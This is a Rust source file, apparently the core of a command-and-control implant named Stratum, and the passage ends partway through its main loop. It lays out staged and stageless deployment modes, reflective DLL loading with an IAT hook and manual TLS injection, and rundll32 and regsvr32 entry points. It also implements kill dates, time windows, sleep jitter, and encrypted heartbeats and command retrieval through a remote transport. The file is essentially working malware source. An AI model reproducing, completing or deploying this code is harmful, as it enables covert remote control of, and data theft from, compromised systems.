//! Stratum native Rust agent — library crate root.
//!
//! Three compile-time modes (set by build.rs via STRATUM_DEPLOY_MODE):
//!   stratum_staged_enc    → staged stub: stub_secret baked, download encrypted stage2, decrypt, exec
//!   stratum_stageless_enc → full agent, C2 config encrypted with stub_secret baked in stub
//!   (neither)             → stageless-plain: fully self-contained agent (original behaviour)

pub mod creds;
pub mod crypto;
pub mod crypto_compat;
pub mod epoch;
pub mod dynapi;
pub mod exec;
pub mod hw;
pub mod inlinexec;
pub mod obfs;
pub mod persist;
pub mod protocol;
pub mod sysinfo;
pub mod transport;

#[cfg(stratum_debug)]
#[macro_export]
macro_rules! dlog {
    ($tag:literal, $msg:literal) => { eprintln!(concat!("[", $tag, "] ", $msg)); };
    ($tag:literal, $fmt:literal, $($arg:tt)*) => { eprintln!(concat!("[", $tag, "] ", $fmt), $($arg)*); };
}
#[cfg(not(stratum_debug))]
#[macro_export]
macro_rules! dlog {
    ($tag:literal, $msg:literal) => {};
    ($tag:literal, $fmt:literal, $($arg:tt)*) => {};
}

#[cfg(stratum_staged_enc)]
pub mod staged;

#[cfg(stratum_stageless_enc)]
pub mod stageless_enc;

#[used]
static PADDING: &[u8] = include_bytes!("../resources/padding.txt");

use std::sync::Arc;
use std::time::Duration;
use chrono::{Datelike, Timelike};

// ── compile-time constants ────────────────────────────────────────────────────

const WINDOW_START:  &str = env!("STRATUM_WINDOW_START");
const WINDOW_END:    &str = env!("STRATUM_WINDOW_END");
const KILL_DATE:     &str = env!("STRATUM_KILL_DATE");
#[cfg(not(windows))] const BLOB_PATH: &str = env!("STRATUM_BLOB_PATH_LINUX");
#[cfg(windows)]      const BLOB_PATH: &str = env!("STRATUM_BLOB_PATH_WIN");

#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
const FOLDER_PATH:    &str = env!("STRATUM_FOLDER_PATH");
#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
const INPUT_FILE:     &str = env!("STRATUM_INPUT_FILE");
#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
const OUTPUT_FILE:    &str = env!("STRATUM_OUTPUT_FILE");
#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
const HEARTBEAT_FILE: &str = env!("STRATUM_HEARTBEAT_FILE");
#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
const BASE_SLEEP_S:   &str = env!("STRATUM_BASE_SLEEP");
#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
const JITTER_PCT_S:   &str = env!("STRATUM_JITTER");
#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
const PUB_KEY_B64:    &str = env!("STRATUM_PUBLIC_KEY_B64");
#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
const STUN_IP:        &str = env!("STRATUM_STUN_IP");
#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
const SESSION_KEY_XOR: &str = env!("STRATUM_SESSION_KEY_XOR");
#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
const SESSION_KEY_MASK: &str = env!("STRATUM_XOR_MASK");
#[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
const PREKEY_POOL_B64: &str = env!("STRATUM_PREKEY_POOL_B64");

// ── DLL entry + LOLBin exports (Windows only) ────────────────────────────────

#[cfg(windows)]
static AGENT_START: std::sync::Once = std::sync::Once::new();

#[cfg(windows)]
#[no_mangle]
pub static AGENT_THREAD_HANDLE: std::sync::atomic::AtomicUsize =
    std::sync::atomic::AtomicUsize::new(0);

// TLS info for the reflective-load path: set by StratumRun, read by StratumCreateThread.
// Stores the three values needed to inject a TLS block into any new thread's TEB.
#[cfg(windows)]
static TLS_ADDR_OF_INDEX: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
#[cfg(windows)]
static TLS_TEMPLATE_VA:   std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
#[cfg(windows)]
static TLS_TEMPLATE_SZ:   std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

// Trampoline: each spawned thread runs this first to init its own TLS,
// then calls the real entry point. Passed via heap-allocated TrampolineArgs.
#[cfg(windows)]
struct TrampolineArgs {
    real_func:  unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
    real_param: *mut std::ffi::c_void,
}
#[cfg(windows)]
unsafe impl Send for TrampolineArgs {}

#[cfg(windows)]
unsafe extern "system" fn tls_trampoline(param: *mut std::ffi::c_void) -> u32 {
    #[cfg(stratum_debug)]
    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] trampoline entered\0".as_ptr()); }

    // Recover args from heap-allocated box, drop it after reading.
    let args = Box::from_raw(param as *mut TrampolineArgs);
    let real_func  = args.real_func;
    let real_param = args.real_param;
    drop(args);

    // Init TLS for this thread — identical to agent_thread_entry logic.
    use std::sync::atomic::Ordering::SeqCst;
    let addr_of_index = TLS_ADDR_OF_INDEX.load(SeqCst) as *const u32;
    let _template_va  = TLS_TEMPLATE_VA.load(SeqCst)   as *const u8; // not used — zero-init only
    let template_sz   = TLS_TEMPLATE_SZ.load(SeqCst);

    if !addr_of_index.is_null() && template_sz > 0 {
        let tls_slot = *addr_of_index as usize;
        // Log slot and template_sz for diagnostics
        #[cfg(stratum_debug)]
        {
            extern "system" { fn OutputDebugStringA(s: *const u8); }
            let mut msg = *b"[CT] trampoline slot=???? sz=????????\0";
            let s = tls_slot;
            msg[20] = b'0' + ((s / 1000) % 10) as u8;
            msg[21] = b'0' + ((s / 100)  % 10) as u8;
            msg[22] = b'0' + ((s / 10)   % 10) as u8;
            msg[23] = b'0' + (s           % 10) as u8;
            let z = template_sz;
            msg[28] = b'0' + ((z / 10000000) % 10) as u8;
            msg[29] = b'0' + ((z / 1000000)  % 10) as u8;
            msg[30] = b'0' + ((z / 100000)   % 10) as u8;
            msg[31] = b'0' + ((z / 10000)    % 10) as u8;
            msg[32] = b'0' + ((z / 1000)     % 10) as u8;
            msg[33] = b'0' + ((z / 100)      % 10) as u8;
            msg[34] = b'0' + ((z / 10)       % 10) as u8;
            msg[35] = b'0' + (z               % 10) as u8;
            OutputDebugStringA(msg.as_ptr());
        }
        // Safety check: slot must be valid (< 1088 = Win32 TLS limit) and non-zero
        if tls_slot == 0 || tls_slot >= 1088 {
            #[cfg(stratum_debug)]
            {
                extern "system" { fn OutputDebugStringA(s: *const u8); }
                let mut msg = *b"[CT] trampoline bad slot=????\0";
                let s = tls_slot;
                msg[24] = b'0' + ((s / 1000) % 10) as u8;
                msg[25] = b'0' + ((s / 100)  % 10) as u8;
                msg[26] = b'0' + ((s / 10)   % 10) as u8;
                msg[27] = b'0' + (s           % 10) as u8;
                OutputDebugStringA(msg.as_ptr());
            }
        } else {
            // Use HeapAlloc directly — bypasses the Rust allocator runtime entirely.
            // std::alloc in a newly-created thread (before TLS is set up) can corrupt
            // heap metadata because the Rust allocator may touch thread-local state.
            extern "system" {
                fn HeapAlloc(heap: *mut core::ffi::c_void, flags: u32, bytes: usize) -> *mut core::ffi::c_void;
                fn GetProcessHeap() -> *mut core::ffi::c_void;
            }
            let tls_block = HeapAlloc(GetProcessHeap(), 0x08 /* HEAP_ZERO_MEMORY */, template_sz)
                as *mut u8;
        if !tls_block.is_null() {
            // Block is already zeroed by HEAP_ZERO_MEMORY.
            // Rust thread_local! vars initialise lazily from a zero block.
            // Write into current thread's ThreadLocalStoragePointer array (gs:[0x58]).
            let tls_array: usize;
            core::arch::asm!("mov {}, gs:[0x58]", out(reg) tls_array, options(nostack, pure, nomem));
            if tls_array != 0 {
                let slot_ptr = (tls_array + tls_slot * 8) as *mut usize;
                *slot_ptr = tls_block as usize;
                #[cfg(stratum_debug)]
                { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] trampoline TLS ok\0".as_ptr()); }
            } else {
                #[cfg(stratum_debug)]
                { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] trampoline tlsp still null\0".as_ptr()); }
            }
        }
        }
    }

    #[cfg(stratum_debug)]
    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] trampoline calling real_func\0".as_ptr()); }
    let ret = real_func(real_param);
    #[cfg(stratum_debug)]
    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] trampoline real_func returned\0".as_ptr()); }
    ret
}

// StratumCreateThread — IAT-patched replacement for CreateThread in the reflective DLL.
// The shellcode loader replaces the CreateThread entry in the DLL's IAT with this
// function so that every thread spawned by reqwest/tokio/std gets a valid TLS block
// before its first instruction runs (Windows skips DLL_THREAD_ATTACH for reflective DLLs).
#[cfg(windows)]
#[no_mangle]
pub unsafe extern "system" fn StratumCreateThread(
    attrs:  *mut std::ffi::c_void,
    stack:  usize,
    func:   unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
    param:  *mut std::ffi::c_void,
    flags:  u32,
    tid_out: *mut u32,
) -> *mut std::ffi::c_void {
    extern "system" {
        fn GetModuleHandleA(name: *const u8) -> *mut std::ffi::c_void;
        fn GetProcAddress(module: *mut std::ffi::c_void, name: *const u8) -> *const std::ffi::c_void;
    }
    #[cfg(stratum_debug)]
    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] StratumCreateThread called\0".as_ptr()); }

    // Resolve the REAL CreateThread directly from kernel32 — NOT via our IAT
    // (which is now patched to point here, causing infinite recursion otherwise).
    type FnCreateThread = unsafe extern "system" fn(
        *mut std::ffi::c_void, usize,
        unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
        *mut std::ffi::c_void, u32, *mut u32,
    ) -> *mut std::ffi::c_void;
    let k32_name = sb!("kernel32.dll");
    let k32 = GetModuleHandleA(k32_name.as_ptr());
    if k32.is_null() {
        #[cfg(stratum_debug)]
        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] k32 null\0".as_ptr()); }
        return std::ptr::null_mut();
    }
    let ct_name = sb!("CreateThread");
    let p_ct = GetProcAddress(k32, ct_name.as_ptr());
    if p_ct.is_null() {
        #[cfg(stratum_debug)]
        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] CreateThread not found\0".as_ptr()); }
        return std::ptr::null_mut();
    }
    let real_create_thread: FnCreateThread = std::mem::transmute(p_ct);

    // Wrap the caller's entry point in tls_trampoline so TLS is initialised
    // as the very first thing the new thread does — before any Rust code runs.
    // The trampoline runs AFTER ntdll's LdrInitializeThunk has set up
    // ThreadLocalStoragePointer, so gs:[0x58] is valid when it fires.
    let args = Box::new(TrampolineArgs { real_func: func, real_param: param });
    let args_ptr = Box::into_raw(args) as *mut std::ffi::c_void;

    let hthread = real_create_thread(
        attrs, stack,
        tls_trampoline,
        args_ptr,
        flags,   // pass flags as-is — no forced SUSPENDED needed
        tid_out,
    );
    if hthread.is_null() {
        // CreateThread failed — free the args to avoid a leak.
        drop(Box::from_raw(args_ptr as *mut TrampolineArgs));
        #[cfg(stratum_debug)]
        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] CreateThread returned null\0".as_ptr()); }
    } else {
        #[cfg(stratum_debug)]
        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CT] thread started\0".as_ptr()); }
    }
    hthread
}

// DllMain — called by _DllMainCRTStartup when loaded normally (rundll32/regsvr32).
// NOT called by the reflective loader path (StratumRun bypasses OEP entirely).
#[cfg(windows)]
#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _module: *mut std::ffi::c_void,
    reason:  u32,
    _res:    *mut std::ffi::c_void,
) -> i32 {
    if reason == 1 {
        AGENT_START.call_once(|| {
            let handle = std::thread::spawn(agent_loop);
            use std::os::windows::io::IntoRawHandle;
            let raw = handle.into_raw_handle();
            AGENT_THREAD_HANDLE.store(raw as usize, std::sync::atomic::Ordering::SeqCst);
        });
    }
    1
}

// rundll32.exe <dll>,Run
#[cfg(windows)]
#[no_mangle]
pub unsafe extern "system" fn Run(
    _hwnd: *mut std::ffi::c_void, _hinst: *mut std::ffi::c_void,
    _cmd:  *const u8,             _show:  i32,
) {
    loop { std::thread::sleep(std::time::Duration::from_secs(3600)); }
}

// StratumCrtInit — called by the reflective loader BEFORE StratumRun.
// Walks the .CRT$XI* and .CRT$XC* initialiser tables that lld-link merges
// into .rdata, bounded by the __xi_a/__xi_z and __xc_a/__xc_z sentinels.
#[cfg(windows)]
#[no_mangle]
pub unsafe extern "system" fn StratumCrtInit() {
    extern "C" {
        static __xi_a: unsafe extern "C" fn();
        static __xi_z: unsafe extern "C" fn();
        static __xc_a: unsafe extern "C" fn();
        static __xc_z: unsafe extern "C" fn();
    }
    #[cfg(stratum_debug)]
    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CI] StratumCrtInit entered\0".as_ptr()); }

    let mut p = &__xi_a as *const _ as *const usize;
    let end   = &__xi_z as *const _ as *const usize;
    while p < end {
        let fp = *p;
        if fp != 0 { let f: unsafe extern "C" fn() = core::mem::transmute(fp); f(); }
        p = p.add(1);
    }
    #[cfg(stratum_debug)]
    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CI] XI inits done\0".as_ptr()); }

    let mut p = &__xc_a as *const _ as *const usize;
    let end   = &__xc_z as *const _ as *const usize;
    while p < end {
        let fp = *p;
        if fp != 0 { let f: unsafe extern "C" fn() = core::mem::transmute(fp); f(); }
        p = p.add(1);
    }
    #[cfg(stratum_debug)]
    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[CI] XC inits done\0".as_ptr()); }
}

#[cfg(windows)]
#[no_mangle]
pub unsafe extern "system" fn StratumRun(
    tls_info_block: *mut std::ffi::c_void,
) -> u32 {
    extern "system" {
        fn CreateThread(
            attrs: *mut std::ffi::c_void,
            stack: usize,
            func:  unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
            param: *mut std::ffi::c_void,
            flags: u32,
            tid:   *mut u32,
        ) -> *mut std::ffi::c_void;
        fn Sleep(ms: u32);
    }

    #[cfg(stratum_debug)]
    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] entered\0".as_ptr()); }

    // Publish TLS info for StratumCreateThread so it can inject TLS into every
    // new thread spawned by reqwest/tokio/std (they all go through our IAT hook).
    {
        use std::sync::atomic::Ordering::SeqCst;
        let blk = tls_info_block as *const usize;
        if !blk.is_null() {
            let aoi = *blk.add(0);  // addr_of_index
            let tva = *blk.add(1);  // tls_template_va
            let tsz = *blk.add(2);  // tls_template_sz
            TLS_ADDR_OF_INDEX.store(aoi, SeqCst);
            TLS_TEMPLATE_VA.store(tva, SeqCst);
            TLS_TEMPLATE_SZ.store(tsz, SeqCst);
            #[cfg(stratum_debug)]
            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS info published\0".as_ptr()); }
        } else {
            #[cfg(stratum_debug)]
            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] no TLS info block\0".as_ptr()); }
        }
    }

    unsafe extern "system" fn agent_thread_entry(param: *mut std::ffi::c_void) -> u32 {
        #[cfg(stratum_debug)]
        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] agent_thread_entry started\0".as_ptr()); }

        // Initialise per-thread TLS storage before any Rust thread-local access.
        // Windows does not call DLL_THREAD_ATTACH for reflectively loaded DLLs.
        // Without this, TEB.TlsSlots[tls_index] is NULL and any thread_local!
        // access triggers __fastfail (ACCESS_VIOLATION bypassing panic hook).
        //
        // param = tls_info_block[3]:
        //   [0] addr_of_index   — VA of DWORD holding the TLS slot index
        //   [1] tls_template_va — VA of start of TLS template data
        //   [2] tls_template_sz — size in bytes of TLS template
        let blk = param as *const usize;
        if !blk.is_null() {
            extern "system" {
                fn HeapAlloc(heap: *mut std::ffi::c_void, flags: u32, bytes: usize) -> *mut std::ffi::c_void;
                fn GetProcessHeap() -> *mut std::ffi::c_void;
            }
            let addr_of_index    = *blk.add(0) as *const u32;
            let _tls_template_va = *blk.add(1) as *const u8; // not used — zero-init only
            let tls_template_sz  = *blk.add(2);
            #[cfg(stratum_debug)]
            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: addr_of_index ok\0".as_ptr()); }
            if !addr_of_index.is_null() && tls_template_sz > 0 {
                let tls_slot = *addr_of_index as usize;
                // log the slot index
                #[cfg(stratum_debug)]
                {
                    extern "system" { fn OutputDebugStringA(s: *const u8); }
                    // simple slot number log via stack buffer
                    let mut buf = [0u8; 32];
                    buf[0] = b'['; buf[1] = b'S'; buf[2] = b'R'; buf[3] = b']';
                    buf[4] = b' '; buf[5] = b'T'; buf[6] = b'L'; buf[7] = b'S';
                    buf[8] = b' '; buf[9] = b's'; buf[10] = b'l'; buf[11] = b'o';
                    buf[12] = b't'; buf[13] = b'=';
                    let slot_str = if tls_slot < 10 {
                        buf[14] = b'0' + tls_slot as u8; buf[15] = 0; 16
                    } else {
                        buf[14] = b'0' + (tls_slot / 10) as u8;
                        buf[15] = b'0' + (tls_slot % 10) as u8;
                        buf[16] = 0; 17
                    };
                    let _ = slot_str;
                    OutputDebugStringA(buf.as_ptr());
                }
                let heap = GetProcessHeap();
                let tls_block = HeapAlloc(heap, 0x08 /* HEAP_ZERO_MEMORY */, tls_template_sz);
                if !tls_block.is_null() {
                    #[cfg(stratum_debug)]
                    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: HeapAlloc ok (zero, no template copy)\0".as_ptr()); }
                    // Do NOT copy the template — leave the block zeroed.
                    // Rust thread_local! vars initialise lazily from a zero block.
                    if tls_slot < 64 {
                        let tls_slots_base: usize;
                        core::arch::asm!(
                            "mov {}, gs:[0x58]",
                            out(reg) tls_slots_base,
                            options(nostack, pure, nomem)
                        );
                        #[cfg(stratum_debug)]
                        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: writing standard slot\0".as_ptr()); }
                        *((tls_slots_base + tls_slot * 8) as *mut usize) = tls_block as usize;
                        #[cfg(stratum_debug)]
                        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: standard slot written\0".as_ptr()); }
                    } else {
                        let exp_slots_base: usize;
                        core::arch::asm!(
                            "mov {}, gs:[0x1480]",
                            out(reg) exp_slots_base,
                            options(nostack, pure, nomem)
                        );
                        if exp_slots_base != 0 {
                            #[cfg(stratum_debug)]
                            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: writing expansion slot\0".as_ptr()); }
                            *((exp_slots_base + (tls_slot - 64) * 8) as *mut usize) = tls_block as usize;
                            #[cfg(stratum_debug)]
                            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: expansion slot written\0".as_ptr()); }
                        } else {
                            #[cfg(stratum_debug)]
                            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: expansion slots ptr is null!\0".as_ptr()); }
                        }
                    }
                } else {
                    #[cfg(stratum_debug)]
                    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: HeapAlloc FAILED\0".as_ptr()); }
                }
            } else {
                #[cfg(stratum_debug)]
                { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: addr_of_index null or sz=0\0".as_ptr()); }
            }
        } else {
            #[cfg(stratum_debug)]
            { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS: no info block (skipped)\0".as_ptr()); }
        }
        #[cfg(stratum_debug)]
        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] TLS init done, calling agent_loop\0".as_ptr()); }

        agent_loop();
        #[cfg(stratum_debug)]
        { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] agent_loop returned\0".as_ptr()); }
        0
    }

    #[cfg(stratum_debug)]
    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] spawning agent thread\0".as_ptr()); }
    let h = CreateThread(
        std::ptr::null_mut(), 0,
        agent_thread_entry, tls_info_block,
        0, std::ptr::null_mut(),
    );
    #[cfg(stratum_debug)]
    { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[SR] agent thread spawned\0".as_ptr()); }
    AGENT_THREAD_HANDLE.store(h as usize, std::sync::atomic::Ordering::SeqCst);

    let mut tick: u32 = 0;
    loop {
        Sleep(60_000);
        tick += 1;
        // Log every minute so we know StratumRun loop is still alive
        #[cfg(stratum_debug)]
        {
            extern "system" { fn OutputDebugStringA(s: *const u8); }
            if tick == 1 { OutputDebugStringA(b"[SR] loop tick 1m\0".as_ptr()); }
            else if tick == 2 { OutputDebugStringA(b"[SR] loop tick 2m\0".as_ptr()); }
            else if tick == 5 { OutputDebugStringA(b"[SR] loop tick 5m\0".as_ptr()); }
        }
    }
}

// regsvr32 /s <dll>
#[cfg(windows)]
#[no_mangle]
pub extern "system" fn DllRegisterServer() -> i32 {
    loop { std::thread::sleep(std::time::Duration::from_secs(3600)); }
}

// ── main entry point ──────────────────────────────────────────────────────────

#[cfg(windows)]
fn _exit_if_dll() {
    unsafe { crate::dynapi::exit_process(0); }
}

#[cfg(not(windows))]
fn _exit_if_dll() {}

pub fn agent_loop() {
    #[cfg(all(windows, stratum_debug))]
    unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] agent_loop entered\0".as_ptr()); }

    #[cfg(stratum_staged_enc)]
    {
        #[cfg(all(windows, stratum_debug))]
        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] mode: staged-enc\0".as_ptr()); }
        staged::run();
        _exit_if_dll();
        return;
    }

    #[cfg(stratum_stageless_enc)]
    { stageless_enc::run(); _exit_if_dll(); return; }

    #[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
    {
        #[cfg(all(windows, stratum_debug))]
        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] mode: stageless-plain\0".as_ptr()); }

        let base_sleep: u64 = BASE_SLEEP_S.parse().unwrap_or(60);
        let jitter_pct: u64 = JITTER_PCT_S.parse().unwrap_or(20);

        #[cfg(all(windows, stratum_debug))]
        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] decode_pem\0".as_ptr()); }
        let pem = match decode_pem(PUB_KEY_B64) {
            Some(p) => p,
            None    => return,
        };
        #[cfg(all(windows, stratum_debug))]
        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] load_public_key\0".as_ptr()); }
        let pub_key = match crypto::load_public_key(&pem) {
            Ok(k)  => k,
            Err(_) => return,
        };
        #[cfg(all(windows, stratum_debug))]
        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] session_key\0".as_ptr()); }
        let session_key: [u8; 32] = {
            let xored = hex::decode(SESSION_KEY_XOR).unwrap_or_default();
            let mask  = hex::decode(SESSION_KEY_MASK).unwrap_or_default();
            if xored.len() != 32 || mask.len() != 32 { return; }
            let mut k = [0u8; 32];
            for i in 0..32 { k[i] = xored[i] ^ mask[i]; }
            k
        };

        #[cfg(all(windows, stratum_debug))]
        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] new_transport\0".as_ptr()); }
        let transport = transport::new_transport();
        #[cfg(all(windows, stratum_debug))]
        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] new_transport done\0".as_ptr()); }
        let state = exec::AgentState::new(
            base_sleep, jitter_pct, FOLDER_PATH, BLOB_PATH, INPUT_FILE, OUTPUT_FILE,
        );
        #[cfg(all(windows, stratum_debug))]
        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] AgentInfo\0".as_ptr()); }
        let info = sysinfo::AgentInfo::collect(STUN_IP);
        let start_cwd = std::env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_default();

        let prekey_pool = epoch::decode_prekey_pool(PREKEY_POOL_B64);
        let agent_id = epoch::derive_agent_id(&session_key);
        let epoch_blob = format!("{}.epoch", BLOB_PATH);
        let mut epoch_state = restore_or_bootstrap_epoch(&epoch_blob, &prekey_pool, &session_key, &agent_id);

        #[cfg(all(windows, stratum_debug))]
        unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(b"[AL] run_loop\0".as_ptr()); }
        run_loop(
            &info, &start_cwd, &pub_key, &session_key, &transport, &state,
            FOLDER_PATH, INPUT_FILE, OUTPUT_FILE, HEARTBEAT_FILE,
            BLOB_PATH, WINDOW_START, WINDOW_END,
            &mut epoch_state, &prekey_pool, &agent_id,
        );
    }
}

fn restore_or_bootstrap_epoch(
    epoch_blob: &str,
    prekey_pool: &[[u8; 32]],
    session_key: &[u8; 32],
    agent_id: &[u8],
) -> epoch::EpochState {
    if let Some(plain) = hw::read_blob(epoch_blob, "epoch-salt") {
        if let Some(data) = plain.strip_prefix("STRATUM:") {
            if let Ok(bytes) = hex::decode(data) {
                if let Some(st) = epoch::epoch_state_from_bytes(&bytes) {
                    dlog!("EP", "epoch state restored, epoch={}", st.epoch);
                    return st;
                }
            }
        }
    }
    let prekey = prekey_pool.first().copied().unwrap_or([0u8; 32]);
    let st = epoch::bootstrap_epoch(&prekey, session_key, agent_id);
    persist_epoch_state(&st, epoch_blob);
    dlog!("EP", "epoch state bootstrapped");
    st
}

fn persist_epoch_state(state: &epoch::EpochState, epoch_blob: &str) {
    let bytes = epoch::epoch_state_to_bytes(state);
    let payload = format!("STRATUM:{}", hex::encode(&bytes));
    hw::write_blob(epoch_blob, payload.as_bytes(), "epoch-salt");
}

// ── main loop ─────────────────────────────────────────────────────────────────

pub(crate) fn run_loop(
    info:        &sysinfo::AgentInfo,
    start_cwd:   &str,
    pub_key:     &crypto::PubKey,
    session_key: &[u8; 32],
    transport:   &transport::SharedTransport,
    state:       &Arc<exec::AgentState>,
    folder:      &str,
    input_f:     &str,
    output_f:    &str,
    hb_f:        &str,
    blob:        &str,
    win_start:   &str,
    win_end:     &str,
    epoch_state: &mut epoch::EpochState,
    prekey_pool: &[[u8; 32]],
    agent_id:    &[u8],
) {
    #[cfg(stratum_debug)]
    macro_rules! rl_log {
        ($s:literal) => { eprintln!(concat!("[RL] ", $s)); };
        ($fmt:literal, $($arg:tt)*) => { eprintln!(concat!("[RL] ", $fmt), $($arg)*); };
    }
    #[cfg(not(stratum_debug))]
    macro_rules! rl_log {
        ($s:literal) => {};
        ($fmt:literal, $($arg:tt)*) => {};
    }

    rl_log!("loop start");
    loop {
        rl_log!("cycle top");
        if !KILL_DATE.is_empty() && kill_date_expired(KILL_DATE) {
            if cfg!(stratum_debug) { eprintln!("[agent] kill date reached — cleaning up"); }
            exec::kill_cleanup_self(state, transport);
            break;
        }

        if !in_window(win_start, win_end) {
            if cfg!(stratum_debug) { eprintln!("[agent] outside time window, sleeping"); }
            std::thread::sleep(Duration::from_secs(60));
            continue;
        }

        // Pre-compute jitter sleep for this iteration; used both for the
        // next_hb_at hint in the heartbeat and for the actual sleep.
        let sleep_secs = compute_sleep_secs(state);

        rl_log!("building heartbeat");
        let op_cwd = state.operator_cwd.lock().unwrap().clone();
        let hb_seq = state.hb_seq.fetch_add(1, std::sync::atomic::Ordering::Relaxed) + 1;
        let next_hb_at = unix_now() + sleep_secs;
        let heartbeat = build_heartbeat(info, start_cwd, &op_cwd, blob, hb_seq, next_hb_at);
        rl_log!("encrypting heartbeat");
        let epoch_blob_path = format!("{}.epoch", blob);
        if let Some(enc) = epoch::encrypt_message_v2(epoch_state, heartbeat.as_bytes()) {
            rl_log!("uploading heartbeat (v2)");
            transport.upload(&format!("{}{}", folder, hb_f), &enc);
            persist_epoch_state(epoch_state, &epoch_blob_path);
            rl_log!("heartbeat uploaded");
        } else {
            rl_log!("heartbeat encrypt failed");
        }

        rl_log!("downloading input");
        let input_path = format!("{}{}", folder, input_f);
        rl_log!("input_path={}", input_path);
        let raw = match transport.download(&input_path) {
            Some(b) => b,
            None    => { rl_log!("download=None, jitter_sleep"); std::thread::sleep(Duration::from_secs(sleep_secs)); rl_log!("jitter_sleep done"); continue; }
        };
        rl_log!("download ok, raw_len={}", raw.len());

        if raw == b"MZ" || raw.is_empty() { rl_log!("raw=MZ/empty, jitter_sleep"); std::thread::sleep(Duration::from_secs(sleep_secs)); rl_log!("jitter_sleep done"); continue; }

        rl_log!("decrypting command");
        let prekey = prekey_pool.first().copied().unwrap_or([0u8; 32]);
        let task = match epoch::decrypt_command_v2(&raw, epoch_state, pub_key, session_key, agent_id, &prekey) {
            Some(t) => {
                persist_epoch_state(epoch_state, &epoch_blob_path);
                t
            }
            None => {
                rl_log!("decrypt failed");
                let km = format!("KM:{}", unix_now());
                if let Some(enc) = epoch::encrypt_message_v2(epoch_state, km.as_bytes()) {
                    transport.upload(&format!("{}{}", folder, hb_f), &enc);
                    persist_epoch_state(epoch_state, &epoch_blob_path);
                }
                std::thread::sleep(Duration::from_secs(sleep_secs));
                continue;
            }
        };

        rl_log!("task decrypted");
        if let Some(exp) = task.expires_at {
            if unix_now() as f64 > exp {
                rl_log!("task expired");
                transport.upload(&input_path, b"MZ");
                std::thread::sleep(Duration::from_secs(sleep_secs));
                continue;
            }
        }

